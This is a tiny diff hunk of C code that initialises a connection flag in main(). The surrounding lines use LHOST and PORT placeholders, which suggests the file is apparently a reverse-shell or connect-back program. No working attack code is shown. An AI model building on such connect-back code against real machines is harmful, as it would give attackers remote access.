@@ -5,7 +5,7 @@
 
 int main(void){
   
-  int connection_established;
+  int connection_established = 1;
   char ip[] = LHOST;
   int port = PORT;
 
